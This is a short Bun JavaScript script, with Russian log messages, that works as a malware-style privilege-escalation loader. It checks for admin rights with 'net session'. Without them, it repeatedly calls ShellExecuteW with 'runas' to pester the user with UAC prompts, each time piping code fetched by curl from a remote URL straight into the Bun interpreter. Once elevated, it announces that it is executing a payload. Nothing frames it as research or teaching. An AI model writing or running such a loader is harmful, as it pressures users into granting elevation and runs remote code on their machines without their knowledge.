// admin-loop.js
(async () => {
  const { dlopen, FFIType, ptr } = await import("bun:ffi");

  const shell32 = dlopen("shell32.dll", {
    ShellExecuteW: {
      args: [FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.ptr, FFIType.i32],
      returns: FFIType.i32,
    },
  });

  const toPtr = (s) => ptr(Buffer.from(s + "\0", "utf16le"));

  const isAdmin = async () => {
    const p = Bun.spawn({ cmd: ["net", "session"], stdout: "pipe", stderr: "pipe" });
    return (await p.exited) === 0;
  };

  console.log("🚀 PID:", process.pid);

  for (let i = 1; i <= 10; i++) {
    if (await isAdmin()) {
      console.log("✅ АДМИН! Выполняем payload...");
      return;
    }

    console.log("❌ Не админ. Запрос UAC...");

    // Рекурсия без диска через curl и пайп
    const cmd = `curl -sL https://githubusercontent.com | bun -`;
    
    shell32.symbols.ShellExecuteW(
      0,
      toPtr("runas"),
      toPtr("cmd.exe"),
      toPtr("/c " + cmd),
      0,
      1
    );

    await new Promise(r => setTimeout(r, 5000));
  }
})();
